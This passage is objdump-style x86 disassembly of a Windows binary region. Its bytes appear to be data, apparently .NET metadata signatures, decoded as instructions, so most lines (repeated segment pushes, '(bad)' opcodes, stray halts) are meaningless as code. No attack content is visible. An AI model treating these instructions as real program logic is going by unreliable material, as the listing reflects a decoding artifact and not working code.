  4090a6:	0b 86 00 08 b7 7a    	or     0x7ab70800(%esi),%eax
  4090ac:	5c                   	pop    %esp
  4090ad:	56                   	push   %esi
  4090ae:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4090b1:	89 08                	mov    %ecx,(%eax)
  4090b3:	31 bf 38 56 ad 36    	xor    %edi,0x36ad5638(%edi)
  4090b9:	4e                   	dec    %esi
  4090ba:	35 14 00 0a 11       	xor    $0x110a0014,%eax
  4090bf:	14 10                	adc    $0x10,%al
  4090c1:	11 0c 0e             	adc    %ecx,(%esi,%ecx,1)
  4090c4:	18 08                	sbb    %cl,(%eax)
  4090c6:	12 21                	adc    (%ecx),%ah
  4090c8:	08 12                	or     %dl,(%edx)
  4090ca:	21 08                	and    %ecx,(%eax)
  4090cc:	10 02                	adc    %al,(%edx)
  4090ce:	11 10                	adc    %edx,(%eax)
  4090d0:	0c 00                	or     $0x0,%al
  4090d2:	06                   	push   %es
  4090d3:	12 18                	adc    (%eax),%bl
  4090d5:	0e                   	push   %cs
  4090d6:	0e                   	push   %cs
  4090d7:	0e                   	push   %cs
  4090d8:	0e                   	push   %cs
  4090d9:	11 25 11 29 03 20    	adc    %esp,0x20032911
  4090df:	00 01                	add    %al,(%ecx)
  4090e1:	02 06                	add    (%esi),%al
  4090e3:	08 02                	or     %al,(%edx)
  4090e5:	06                   	push   %es
  4090e6:	18 02                	sbb    %al,(%edx)
  4090e8:	06                   	push   %es
  4090e9:	0e                   	push   %cs
  4090ea:	03 06                	add    (%esi),%eax
  4090ec:	11 10                	adc    %edx,(%eax)
  4090ee:	04 01                	add    $0x1,%al
  4090f0:	00 00                	add    %al,(%eax)
  4090f2:	00 04 02             	add    %al,(%edx,%eax,1)
  4090f5:	00 00                	add    %al,(%eax)
  4090f7:	00 04 04             	add    %al,(%esp,%eax,1)
  4090fa:	00 00                	add    %al,(%eax)
  4090fc:	00 04 08             	add    %al,(%eax,%ecx,1)
  4090ff:	00 00                	add    %al,(%eax)
  409101:	00 04 10             	add    %al,(%eax,%edx,1)
  409104:	00 00                	add    %al,(%eax)
  409106:	00 04 40             	add    %al,(%eax,%eax,2)
  409109:	00 00                	add    %al,(%eax)
  40910b:	00 04 80             	add    %al,(%eax,%eax,4)
  40910e:	00 00                	add    %al,(%eax)
  409110:	00 04 00             	add    %al,(%eax,%eax,1)
  409113:	01 00                	add    %eax,(%eax)
  409115:	00 04 00             	add    %al,(%eax,%eax,1)
  409118:	02 00                	add    (%eax),%al
  40911a:	00 04 00             	add    %al,(%eax,%eax,1)
  40911d:	04 00                	add    $0x0,%al
  40911f:	00 04 00             	add    %al,(%eax,%eax,1)
  409122:	08 00                	or     %al,(%eax)
  409124:	00 04 00             	add    %al,(%eax,%eax,1)
  409127:	10 00                	adc    %al,(%eax)
  409129:	00 04 00             	add    %al,(%eax,%eax,1)
  40912c:	40                   	inc    %eax
  40912d:	00 00                	add    %al,(%eax)
  40912f:	04 00                	add    $0x0,%al
  409131:	00 02                	add    %al,(%edx)
  409133:	00 04 00             	add    %al,(%eax,%eax,1)
  409136:	00 04 00             	add    %al,(%eax,%eax,1)
  409139:	04 00                	add    $0x0,%al
  40913b:	00 08                	add    %cl,(%eax)
  40913d:	00 04 00             	add    %al,(%eax,%eax,1)
  409140:	00 10                	add    %dl,(%eax)
  409142:	00 03                	add    %al,(%ebx)
  409144:	06                   	push   %es
  409145:	11 14 04             	adc    %edx,(%esp,%eax,1)
  409148:	00 00                	add    %al,(%eax)
  40914a:	00 00                	add    %al,(%eax)
  40914c:	04 c7                	add    $0xc7,%al
  40914e:	04 00                	add    $0x0,%al
  409150:	00 04 20             	add    %al,(%eax,%eiz,1)
  409153:	05 00 00 04 90       	add    $0x90040000,%eax
  409158:	04 00                	add    $0x0,%al
  40915a:	00 04 23             	add    %al,(%ebx,%eiz,1)
  40915d:	05 00 00 04 7a       	add    $0x7a040000,%eax
  409162:	00 00                	add    %al,(%eax)
  409164:	00 04 57             	add    %al,(%edi,%edx,2)
  409167:	00 00                	add    %al,(%eax)
  409169:	00 04 ec             	add    %al,(%esp,%ebp,8)
  40916c:	03 00                	add    (%eax),%eax
  40916e:	00 03                	add    %al,(%ebx)
  409170:	06                   	push   %es
  409171:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  409177:	2d 05 20 01 01       	sub    $0x1012005,%eax
  40917c:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  409182:	31 05 20 01 01 11    	xor    %eax,0x11010120
  409188:	31 04 20             	xor    %eax,(%eax,%eiz,1)
  40918b:	00 11                	add    %dl,(%ecx)
  40918d:	35 05 20 01 01       	xor    $0x1012005,%eax
  409192:	11 35 03 20 00 08    	adc    %esi,0x8002003
  409198:	04 20                	add    $0x20,%al
  40919a:	01 01                	add    %eax,(%ecx)
  40919c:	08 03                	or     %al,(%ebx)
  40919e:	06                   	push   %es
  40919f:	12 15 0c 20 01 14    	adc    0x1401200c,%dl
  4091a5:	11 39                	adc    %edi,(%ecx)
  4091a7:	02 00                	add    (%eax),%al
  4091a9:	02 00                	add    (%eax),%al
  4091ab:	00 11                	add    %dl,(%ecx)
  4091ad:	3d 03 20 00 02       	cmp    $0x2002003,%eax
  4091b2:	06                   	push   %es
  4091b3:	20 01                	and    %al,(%ecx)
  4091b5:	11 41 11             	adc    %eax,0x11(%ecx)
  4091b8:	45                   	inc    %ebp
  4091b9:	0b 20                	or     (%eax),%esp
  4091bb:	04 01                	add    $0x1,%al
  4091bd:	11 3d 11 35 11 3d    	adc    %edi,0x3d113511
  4091c3:	11 39                	adc    %edi,(%ecx)
  4091c5:	07                   	pop    %es
  4091c6:	20 02                	and    %al,(%edx)
  4091c8:	01 11                	add    %edx,(%ecx)
  4091ca:	3d 11 39 0d 20       	cmp    $0x200d3911,%eax
  4091cf:	02 01                	add    (%ecx),%al
  4091d1:	11 35 14 11 39 02    	adc    %esi,0x2391114
  4091d7:	00 02                	add    %al,(%edx)
  4091d9:	00 00                	add    %al,(%eax)
  4091db:	03 20                	add    (%eax),%esp
  4091dd:	00 0e                	add    %cl,(%esi)
  4091df:	04 20                	add    $0x20,%al
  4091e1:	01 01                	add    %eax,(%ecx)
  4091e3:	0e                   	push   %cs
  4091e4:	04 28                	add    $0x28,%al
  4091e6:	00 11                	add    %dl,(%ecx)
  4091e8:	2d 04 28 00 11       	sub    $0x11002804,%eax
  4091ed:	31 04 28             	xor    %eax,(%eax,%ebp,1)
  4091f0:	00 11                	add    %dl,(%ecx)
  4091f2:	35 03 28 00 08       	xor    $0x8002803,%eax
  4091f7:	03 28                	add    (%eax),%ebp
  4091f9:	00 02                	add    %al,(%edx)
  4091fb:	03 28                	add    (%eax),%ebp
  4091fd:	00 0e                	add    %cl,(%esi)
  4091ff:	04 00                	add    $0x0,%al
  409201:	01 18                	add    %ebx,(%eax)
  409203:	09 09                	or     %ecx,(%ecx)
  409205:	00 04 11             	add    %al,(%ecx,%edx,1)
  409208:	49                   	dec    %ecx
  409209:	0e                   	push   %cs
  40920a:	0e                   	push   %cs
  40920b:	10 0e                	adc    %cl,(%esi)
  40920d:	02 08                	add    (%eax),%cl
  40920f:	00 03                	add    %al,(%ebx)
  409211:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409214:	0e                   	push   %cs
  409215:	10 0e                	adc    %cl,(%esi)
  409217:	0c 00                	or     $0x0,%al
  409219:	04 08                	add    $0x8,%al
  40921b:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409220:	51                   	push   %ecx
  409221:	08 0e                	or     %cl,(%esi)
  409223:	0e                   	push   %cs
  409224:	0b 00                	or     (%eax),%eax
  409226:	06                   	push   %es
  409227:	08 09                	or     %cl,(%ecx)
  409229:	09 1d 05 12 21 08    	or     %ebx,0x8211205
  40922f:	09 07                	or     %eax,(%edi)
  409231:	00 03                	add    %al,(%ebx)
  409233:	0e                   	push   %cs
  409234:	11 55 02             	adc    %edx,0x2(%ebp)
  409237:	02 07                	add    (%edi),%al
  409239:	00 03                	add    %al,(%ebx)
  40923b:	11 41 0e             	adc    %eax,0xe(%ecx)
  40923e:	0e                   	push   %cs
  40923f:	02 02                	add    (%edx),%al
  409241:	06                   	push   %es
  409242:	02 03                	add    (%ebx),%al
  409244:	06                   	push   %es
  409245:	11 41 06             	adc    %eax,0x6(%ecx)
  409248:	20 02                	and    %al,(%edx)
  40924a:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40924d:	59                   	pop    %ecx
  40924e:	03 06                	add    (%esi),%eax
  409250:	12 5d 07             	adc    0x7(%ebp),%bl
  409253:	06                   	push   %es
  409254:	15 12 61 01 11       	adc    $0x11016112,%eax
  409259:	34 08                	xor    $0x8,%al
  40925b:	b0 3f                	mov    $0x3f,%al
  40925d:	5f                   	pop    %edi
  40925e:	7f 11                	jg     0x409271
  409260:	d5 0a                	aad    $0xa
  409262:	3a 06                	cmp    (%esi),%al
  409264:	20 01                	and    %al,(%ecx)
  409266:	11 65 11             	adc    %esp,0x11(%ebp)
  409269:	2d 06 20 02 01       	sub    $0x1022006,%eax
  40926e:	1c 12                	sbb    $0x12,%al
  409270:	69 07 20 02 01 10    	imul   $0x10010220,(%edi),%eax
  409276:	11 34 08             	adc    %esi,(%eax,%ecx,1)
  409279:	05 20 01 01 12       	add    $0x12010120,%eax
  40927e:	6d                   	insl   (%dx),%es:(%edi)
  40927f:	03 06                	add    (%esi),%eax
  409281:	12 71 03             	adc    0x3(%ecx),%dh
  409284:	06                   	push   %es
  409285:	12 75 05             	adc    0x5(%ebp),%dh
  409288:	00 01                	add    %al,(%ecx)
  40928a:	19 11                	sbb    %edx,(%ecx)
  40928c:	40                   	inc    %eax
  40928d:	05 00 01 11 3c       	add    $0x3c110100,%eax
  409292:	19 03                	sbb    %eax,(%ebx)
  409294:	00 00                	add    %al,(%eax)
  409296:	02 02                	add    (%edx),%al
  409298:	06                   	push   %es
  409299:	09 03                	or     %eax,(%ebx)
  40929b:	06                   	push   %es
  40929c:	11 3c 04             	adc    %edi,(%esp,%eax,1)
  40929f:	03 00                	add    (%eax),%eax
  4092a1:	00 00                	add    %al,(%eax)
  4092a3:	04 00                	add    $0x0,%al
  4092a5:	80 00 00             	addb   $0x0,(%eax)
  4092a8:	03 06                	add    (%esi),%eax
  4092aa:	11 40 04             	adc    %eax,0x4(%eax)
  4092ad:	f6 ff                	idiv   %bh
  4092af:	ff                   	(bad)
  4092b0:	ff 04 f5 ff ff ff 04 	incl   0x4ffffff(,%esi,8)
  4092b7:	f4                   	hlt
  4092b8:	ff                   	(bad)
  4092b9:	ff                   	(bad)
  4092ba:	ff 03                	incl   (%ebx)
  4092bc:	06                   	push   %es
  4092bd:	12 1c 12             	adc    (%edx,%edx,1),%bl
  4092c0:	20 03                	and    %al,(%ebx)
  4092c2:	15 12 79 02 0e       	adc    $0xe027912,%eax
  4092c7:	12 7d 0e             	adc    0xe(%ebp),%bh
  4092ca:	0e                   	push   %cs
  4092cb:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  4092d0:	80 81 0c 20 04 08 0e 	addb   $0xe,0x804200c(%ecx)
  4092d7:	0e                   	push   %cs
  4092d8:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  4092dd:	51                   	push   %ecx
  4092de:	08 0d 20 06 12 80    	or     %cl,0x80120620
  4092e4:	85 0e                	test   %ecx,(%esi)
  4092e6:	0e                   	push   %cs
  4092e7:	0e                   	push   %cs
  4092e8:	0e                   	push   %cs
  4092e9:	11 25 11 29 09 20    	adc    %esp,0x20092911
  4092ef:	04 12                	add    $0x12,%al
  4092f1:	80 85 0e 0e 0e 0e 04 	addb   $0x4,0xe0e0e0e(%ebp)
  4092f8:	20 00                	and    %al,(%eax)
  4092fa:	12 11                	adc    (%ecx),%dl
  4092fc:	05 20 00 12 80       	add    $0x80120020,%eax
  409301:	89 08                	mov    %ecx,(%eax)
  409303:	20 03                	and    %al,(%ebx)
  409305:	01 11                	add    %edx,(%ecx)
  409307:	2d 11 2d 0e 03       	sub    $0x30e2d11,%eax
  40930c:	06                   	push   %es
  40930d:	12 30                	adc    (%eax),%dh
  40930f:	06                   	push   %es
  409310:	20 02                	and    %al,(%edx)
  409312:	01 0a                	add    %ecx,(%edx)
  409314:	12 6d 04             	adc    0x4(%ebp),%ch
  409317:	28 00                	sub    %al,(%eax)
  409319:	12 11                	adc    (%ecx),%dl
  40931b:	03 06                	add    (%esi),%eax
  40931d:	12 50 03             	adc    0x3(%eax),%dl
  409320:	06                   	push   %es
  409321:	12 44 04 06          	adc    0x6(%esp,%eax,1),%al
  409325:	12 80 8d 04 06 11    	adc    0x1106048d(%eax),%al
  40932b:	80 91 07 20 02 01 12 	adcb   $0x12,0x1022007(%ecx)
  409332:	50                   	push   %eax
  409333:	12 44 04 20          	adc    0x20(%esp,%eax,1),%al
  409337:	00 12                	add    %dl,(%edx)
  409339:	7d 03                	jge    0x40933e
  40933b:	06                   	push   %es
  40933c:	12 7d 05             	adc    0x5(%ebp),%bh
  40933f:	20 00                	and    %al,(%eax)
  409341:	12 80 8d 05 20 00    	adc    0x20058d(%eax),%al
  409347:	11 80 91 04 20 00    	adc    %eax,0x200491(%eax)
  40934d:	12 19                	adc    (%ecx),%bl
  40934f:	05 20 00 12 80       	add    $0x80120020,%eax
  409354:	95                   	xchg   %eax,%ebp
  409355:	04 28                	add    $0x28,%al
  409357:	00 12                	add    %dl,(%edx)
  409359:	7d 05                	jge    0x409360
  40935b:	28 00                	sub    %al,(%eax)
  40935d:	12 80 8d 05 28 00    	adc    0x28058d(%eax),%al
  409363:	11 80 91 04 28 00    	adc    %eax,0x280491(%eax)
  409369:	12 19                	adc    (%ecx),%bl
  40936b:	05 28 00 12 80       	add    $0x80120028,%eax
  409370:	95                   	xchg   %eax,%ebp
  409371:	05 20 01 01 12       	add    $0x12010120,%eax
  409376:	44                   	inc    %esp
  409377:	04 20                	add    $0x20,%al
  409379:	01 01                	add    %eax,(%ecx)
  40937b:	02 05 00 01 08 1d    	add    0x1d080100,%al
  409381:	0e                   	push   %cs
  409382:	07                   	pop    %es
  409383:	00 02                	add    %al,(%edx)
  409385:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  409388:	80 99 06 20 01 01 11 	sbbb   $0x11,0x1012006(%ecx)
  40938f:	80 a1 01 02 01 15 05 	andb   $0x5,0x15010201(%ecx)
  409396:	20 02                	and    %al,(%edx)
  409398:	01 0e                	add    %ecx,(%esi)
  40939a:	08 04 00             	or     %al,(%eax,%eax,1)
  40939d:	01 02                	add    %eax,(%edx)
  40939f:	0e                   	push   %cs
  4093a0:	06                   	push   %es
  4093a1:	10 01                	adc    %al,(%ecx)
  4093a3:	01 08                	add    %ecx,(%eax)
  4093a5:	1e                   	push   %ds
  4093a6:	00 04 0a             	add    %al,(%edx,%ecx,1)
  4093a9:	01 11                	add    %edx,(%ecx)
  4093ab:	0c 0f                	or     $0xf,%al
  4093ad:	07                   	pop    %es
  4093ae:	07                   	pop    %es
  4093af:	12 21                	adc    (%ecx),%ah
  4093b1:	12 21                	adc    (%ecx),%ah
  4093b3:	11 0c 02             	adc    %ecx,(%edx,%eax,1)
  4093b6:	11 10                	adc    %edx,(%eax)
  4093b8:	11 14 12             	adc    %edx,(%edx,%edx,1)
  4093bb:	18 06                	sbb    %al,(%esi)
  4093bd:	20 01                	and    %al,(%ecx)
  4093bf:	01 11                	add    %edx,(%ecx)
  4093c1:	80 e5 05             	and    $0x5,%ch
  4093c4:	20 02                	and    %al,(%edx)
  4093c6:	01 08                	add    %ecx,(%eax)
  4093c8:	08 04 20             	or     %al,(%eax,%eiz,1)
  4093cb:	01 01                	add    %eax,(%ecx)
  4093cd:	0d 08 14 11 39       	or     $0x39111408,%eax
  4093d2:	02 00                	add    (%eax),%al
  4093d4:	02 00                	add    (%eax),%al
  4093d6:	00 07                	add    %al,(%edi)
  4093d8:	20 02                	and    %al,(%edx)
  4093da:	10 11                	adc    %dl,(%ecx)
  4093dc:	39 08                	cmp    %ecx,(%eax)
  4093de:	08 0b                	or     %cl,(%ebx)
  4093e0:	20 04 01             	and    %al,(%ecx,%eax,1)
  4093e3:	03 11                	add    (%ecx),%edx
  4093e5:	2d 11 2d 11 80       	sub    $0x80112d11,%eax
  4093ea:	f1                   	int1
  4093eb:	0c 07                	or     $0x7,%al
  4093ed:	03 14 11             	add    (%ecx,%edx,1),%edx
  4093f0:	39 02                	cmp    %eax,(%edx)
  4093f2:	00 02                	add    %al,(%edx)
  4093f4:	00 00                	add    %al,(%eax)
  4093f6:	08 08                	or     %cl,(%eax)
  4093f8:	04 07                	add    $0x7,%al
  4093fa:	01 11                	add    %edx,(%ecx)
  4093fc:	35 04 07 01 11       	xor    $0x11010704,%eax
  409401:	31 05 00 00 12 80    	xor    %eax,0x80120000
  409407:	f5                   	cmc
  409408:	05 20 02 01 0c       	add    $0xc010220,%eax
  40940d:	0c 06                	or     $0x6,%al
  40940f:	20 01                	and    %al,(%ecx)
  409411:	01 11                	add    %edx,(%ecx)
  409413:	80 f9 06             	cmp    $0x6,%cl
  409416:	20 01                	and    %al,(%ecx)
  409418:	01 11                	add    %edx,(%ecx)
  40941a:	81 01 06 20 01 01    	addl   $0x1012006,(%ecx)
  409420:	11 81 0d 08 00 01    	adc    %eax,0x100080d(%ecx)
  409426:	12 81 11 12 80 ed    	adc    -0x127fedef(%ecx),%al
  40942c:	05 20 00 11 81       	add    $0x81110020,%eax
  409431:	15 06 20 01 01       	adc    $0x1012006,%eax
  409436:	11 81 19 05 20 00    	adc    %eax,0x200519(%ecx)
  40943c:	12 81 1d 06 20 01    	adc    0x120061d(%ecx),%al
  409442:	01 12                	add    %edx,(%edx)
  409444:	80 ed 07             	sub    $0x7,%ch
  409447:	20 04 01             	and    %al,(%ecx,%eax,1)
  40944a:	08 08                	or     %cl,(%eax)
  40944c:	08 08                	or     %cl,(%eax)
  40944e:	04 00                	add    $0x0,%al
  409450:	01 0e                	add    %ecx,(%esi)
  409452:	18 05 20 01 01 11    	sbb    %al,0x11010120
  409458:	49                   	dec    %ecx
  409459:	05 00 02 08 08       	add    $0x8080200,%eax
  40945e:	08 07                	or     %al,(%edi)
  409460:	20 01                	and    %al,(%ecx)
  409462:	01 1d 12 80 ed 06    	add    %ebx,0x6ed8012
  409468:	20 01                	and    %al,(%ecx)
  40946a:	01 11                	add    %edx,(%ecx)
  40946c:	81 25 06 20 01 01 11 	andl   $0x5298111,0x1012006
  409473:	81 29 05 
  409476:	00 00                	add    %al,(%eax)
  409478:	12 81 2d 06 00 01    	adc    0x100062d(%ecx),%al
  40947e:	12 81 31 0e 06 20    	adc    0x20060e31(%ecx),%al
  409484:	01 01                	add    %eax,(%ecx)
  409486:	12 81 31 06 20 01    	adc    0x1200631(%ecx),%al
  40948c:	01 12                	add    %edx,(%edx)
  40948e:	81 35 04 20 00 11 49 	xorl   $0xa071a49,0x11002004
  409495:	1a 07 0a 
  409498:	12 15 12 71 12 81    	adc    0x81127112,%dl
  40949e:	05 12 81 09 12       	add    $0x12098112,%eax
  4094a3:	81 09 0e 0e 11 49    	orl    $0x49110e0e,(%ecx)
  4094a9:	11 81 15 1d 12 80    	adc    %eax,-0x7fede2eb(%ecx)
  4094af:	ed                   	in     (%dx),%eax
  4094b0:	06                   	push   %es
  4094b1:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  4094b6:	51                   	push   %ecx
  4094b7:	09 20                	or     %esp,(%eax)
  4094b9:	00 15 12 81 41 01    	add    %dl,0x1418112
  4094bf:	13 00                	adc    (%eax),%eax
  4094c1:	07                   	pop    %es
  4094c2:	15 12 81 41 01       	adc    $0x1418112,%eax
  4094c7:	12 51 04             	adc    0x4(%ecx),%dl
  4094ca:	20 00                	and    %al,(%eax)
  4094cc:	13 00                	adc    (%eax),%eax
  4094ce:	07                   	pop    %es
  4094cf:	20 02                	and    %al,(%edx)
  4094d1:	01 12                	add    %edx,(%edx)
  4094d3:	80 ed 0e             	sub    $0xe,%ch
  4094d6:	25 07 0f 12 15       	and    $0x15120f07,%eax
  4094db:	1d 12 81 39 12       	sbb    $0x12398112,%eax
  4094e0:	81 3d 12 81 09 08 08 	cmpl   $0x8711208,0x8098112
  4094e7:	12 71 08 
  4094ea:	08 12                	or     %dl,(%edx)
  4094ec:	51                   	push   %ecx
  4094ed:	08 08                	or     %cl,(%eax)
  4094ef:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  4094f5:	15 12 81 41 01       	adc    $0x1418112,%eax
  4094fa:	12 51 06             	adc    0x6(%ecx),%dl
  4094fd:	07                   	pop    %es
  4094fe:	02 12                	add    (%edx),%dl
  409500:	21 1d 05 09 07 03    	and    %ebx,0x3070905
  409506:	12 2c 12             	adc    (%edx,%edx,1),%ch
  409509:	71 11                	jno    0x40951c
  40950b:	81 15 05 20 02 01 1c 	adcl   $0x2006181c,0x1022005
  409512:	18 06 20 
  409515:	01 01                	add    %eax,(%ecx)
  409517:	12 81 51 04 20 00    	adc    0x200451(%ecx),%al
  40951d:	11 55 04             	adc    %edx,0x4(%ebp)
  409520:	20 01                	and    %al,(%ecx)
  409522:	03 08                	add    (%eax),%ecx
  409524:	04 20                	add    $0x20,%al
  409526:	01 01                	add    %eax,(%ecx)
  409528:	03 06                	add    (%esi),%eax
  40952a:	20 01                	and    %al,(%ecx)
  40952c:	01 11                	add    %edx,(%ecx)
  40952e:	81 55 05 20 00 11 81 	adcl   $0x81110020,0x5(%ebp)
  409535:	55                   	push   %ebp
  409536:	04 00                	add    $0x0,%al
  409538:	00 11                	add    %dl,(%ecx)
  40953a:	65 05 00 01 11 65    	gs add $0x65110100,%eax
  409540:	0e                   	push   %cs
  409541:	04 07                	add    $0x7,%al
  409543:	01 11                	add    %edx,(%ecx)
  409545:	2d 05 20 01 01       	sub    $0x1012005,%eax
  40954a:	11 65 06             	adc    %esp,0x6(%ebp)
  40954d:	20 01                	and    %al,(%ecx)
  40954f:	01 12                	add    %edx,(%edx)
  409551:	81 61 06 15 12 61 01 	andl   $0x1611215,0x6(%ecx)
  409558:	11 34 05 20 01 13 00 	adc    %esi,0x130120(,%eax,1)
  40955f:	08 05 20 00 12 81    	or     %al,0x81120020
  409565:	65 09 20             	or     %esp,%gs:(%eax)
  409568:	02 01                	add    (%ecx),%al
  40956a:	12 81 65 11 81 69    	adc    0x69811165(%ecx),%al
  409570:	06                   	push   %es
  409571:	20 01                	and    %al,(%ecx)
  409573:	01 12                	add    %edx,(%edx)
  409575:	81 65 06 20 01 01 11 	andl   $0x11010120,0x6(%ebp)
  40957c:	81 6d 05 20 00 11 81 	subl   $0x81110020,0x5(%ebp)
  409583:	71 05                	jno    0x40958a
  409585:	20 01                	and    %al,(%ecx)
  409587:	01 13                	add    %edx,(%ebx)
  409589:	00 06                	add    %al,(%esi)
  40958b:	20 02                	and    %al,(%edx)
  40958d:	01 08                	add    %ecx,(%eax)
  40958f:	13 00                	adc    (%eax),%eax
  409591:	06                   	push   %es
  409592:	20 03                	and    %al,(%ebx)
  409594:	01 08                	add    %ecx,(%eax)
  409596:	08 08                	or     %cl,(%eax)
  409598:	03 20                	add    (%eax),%esp
  40959a:	00 0d 07 00 04 0e    	add    %cl,0xe040007
  4095a0:	0e                   	push   %cs
  4095a1:	1c 1c                	sbb    $0x1c,%al
  4095a3:	1c 05                	sbb    $0x5,%al
  4095a5:	00 02                	add    %al,(%edx)
  4095a7:	0e                   	push   %cs
  4095a8:	0e                   	push   %cs
  4095a9:	0e                   	push   %cs
  4095aa:	03 00                	add    (%eax),%eax
  4095ac:	00 01                	add    %al,(%ecx)
  4095ae:	2d 07 14 08 08       	sub    $0x8081407,%eax
  4095b3:	08 11                	or     %dl,(%ecx)
  4095b5:	34 08                	xor    $0x8,%al
  4095b7:	08 08                	or     %cl,(%eax)
  4095b9:	08 08                	or     %cl,(%eax)
  4095bb:	11 81 79 11 81 15    	adc    %eax,0x15811179(%ecx)
  4095c1:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  4095c7:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  4095cd:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  4095d3:	11 81 15 11 81 15    	adc    %eax,0x15811115(%ecx)
  4095d9:	11 81 15 05 07 02    	adc    %eax,0x2070515(%ecx)
  4095df:	19 11                	sbb    %edx,(%ecx)
  4095e1:	3c 06                	cmp    $0x6,%al
  4095e3:	00 02                	add    %al,(%edx)
  4095e5:	11 49 0e             	adc    %ecx,0xe(%ecx)
  4095e8:	0e                   	push   %cs
  4095e9:	07                   	pop    %es
  4095ea:	15 12 79 02 0e       	adc    $0xe027912,%eax
  4095ef:	12 7d 07             	adc    0x7(%ebp),%bh
  4095f2:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  4095f7:	80 81 08 15 12 81 41 	addb   $0x41,-0x7eedeaf8(%ecx)
  4095fe:	01 12                	add    %edx,(%edx)
  409600:	80 81 08 00 01 12 81 	addb   $0x81,0x12010008(%ecx)
  409607:	89 11                	mov    %edx,(%ecx)
  409609:	81 8d 06 00 01 12 81 	orl    $0x50e8981,0x12010006(%ebp)
  409610:	89 0e 05 
  409613:	20 00                	and    %al,(%eax)
  409615:	12 81 89 06 00 03    	adc    0x3000689(%ecx),%al
  40961b:	0e                   	push   %cs
  40961c:	0e                   	push   %cs
  40961d:	0e                   	push   %cs
  40961e:	0e                   	push   %cs
  40961f:	09 20                	or     %esp,(%eax)
  409621:	01 12                	add    %edx,(%edx)
  409623:	81 89 1d 12 81 89 05 	orl    $0x121d0605,-0x767eede3(%ecx)
  40962a:	06 1d 12 
  40962d:	81 89 13 20 04 12 81 	orl    $0x81119581,0x12042013(%ecx)
  409634:	95 11 81 
  409637:	99                   	cltd
  409638:	12 81 9d 1d 12 81    	adc    -0x7eede263(%ecx),%al
  40963e:	89 1d 11 81 a1 05    	mov    %ebx,0x5a18111
  409644:	20 01                	and    %al,(%ecx)
  409646:	1c 1d                	sbb    $0x1d,%al
  409648:	1c 06                	sbb    $0x6,%al
  40964a:	00 03                	add    %al,(%ebx)
  40964c:	0e                   	push   %cs
  40964d:	0e                   	push   %cs
  40964e:	1c 1c                	sbb    $0x1c,%al
  409650:	07                   	pop    %es
  409651:	00 02                	add    %al,(%edx)
  409653:	1c 1c                	sbb    $0x1c,%al
  409655:	12 81 89 0d 20 05    	adc    0x5200d89(%ecx),%al
  40965b:	1c 0e                	sbb    $0xe,%al
  40965d:	11 81 99 12 81 9d    	adc    %eax,-0x627eed67(%ecx)
  409663:	1c 1d                	sbb    $0x1d,%al
  409665:	1c 04                	sbb    $0x4,%al
  409667:	20 01                	and    %al,(%ecx)
  409669:	01 1c 07             	add    %ebx,(%edi,%eax,1)
  40966c:	20 02                	and    %al,(%edx)
  40966e:	01 13                	add    %edx,(%ebx)
  409670:	00 13                	add    %dl,(%ebx)
  409672:	01 09                	add    %ecx,(%ecx)
  409674:	00 02                	add    %al,(%edx)
  409676:	02 12                	add    (%edx),%dl
  409678:	81 89 12 81 89 05 00 	orl    $0xe0e0200,0x5898112(%ecx)
  40967f:	02 0e 0e 
  409682:	1c 05                	sbb    $0x5,%al
  409684:	00 02                	add    %al,(%edx)
  409686:	02 0e                	add    (%esi),%cl
  409688:	0e                   	push   %cs
  409689:	3e 07                	ds pop %es
  40968b:	17                   	pop    %ss
  40968c:	0e                   	push   %cs
  40968d:	0e                   	push   %cs
  40968e:	15 12 79 02 0e       	adc    $0xe027912,%eax
  409693:	12 7d 12             	adc    0x12(%ebp),%bh
  409696:	80 81 12 81 89 12 81 	addb   $0x81,0x12898112(%ecx)
  40969d:	89 12                	mov    %edx,(%edx)
  40969f:	81 89 12 81 95 1c 08 	orl    $0x121c0e08,0x1c958112(%ecx)
  4096a6:	0e 1c 12 
  4096a9:	81 ad 12 81 a9 1c 0e 	subl   $0x8580120e,0x1ca98112(%ebp)
  4096b0:	12 80 85 
  4096b3:	12 80 89 12 81 ad    	adc    -0x527eed77(%eax),%al
  4096b9:	15 12 81 41 01       	adc    $0x1418112,%eax
  4096be:	12 80 81 03 1d 12    	adc    0x121d0381(%eax),%al
  4096c4:	81 89 1d 1c 03 07 01 	orl    $0x20040801,0x7031c1d(%ecx)
  4096cb:	08 04 20 
  4096ce:	00 1d 03 07 20 02    	add    %bl,0x2200703
  4096d4:	01 0e                	add    %ecx,(%esi)
  4096d6:	12 80 89 0b 07 05    	adc    0x5070b89(%eax),%al
  4096dc:	12 18                	adc    (%eax),%bl
  4096de:	12 80 89 03 1d 03    	adc    0x31d0389(%eax),%al
  4096e4:	08 03                	or     %al,(%ebx)
  4096e6:	07                   	pop    %es
  4096e7:	01 0e                	add    %ecx,(%esi)
  4096e9:	06                   	push   %es
  4096ea:	00 01                	add    %al,(%ecx)
  4096ec:	11 81 b5 02 05 20    	adc    %eax,0x200502b5(%ecx)
  4096f2:	00 11                	add    %dl,(%ecx)
  4096f4:	81 b9 04 00 01 01 0e 	cmpl   $0x20030e,0x1010004(%ecx)
  4096fb:	03 20 00 
  4096fe:	03 08                	add    (%eax),%ecx
  409700:	07                   	pop    %es
  409701:	02 12                	add    (%edx),%dl
  409703:	80 89 11 81 b5 09 07 	orb    $0x7,0x9b58111(%ecx)
  40970a:	05 12 80 89 0e       	add    $0xe898012,%eax
  40970f:	03 0e                	add    (%esi),%ecx
  409711:	08 05 00 00 12 81    	or     %al,0x81120000
  409717:	bd 05 00 00 11       	mov    $0x11000005,%ebp
  40971c:	80 91 05 00 01 12 7d 	adcb   $0x7d,0x12010005(%ecx)
  409723:	1c 04                	sbb    $0x4,%al
  409725:	07                   	pop    %es
  409726:	01 12                	add    %edx,(%edx)
  409728:	7d 04                	jge    0x40972e
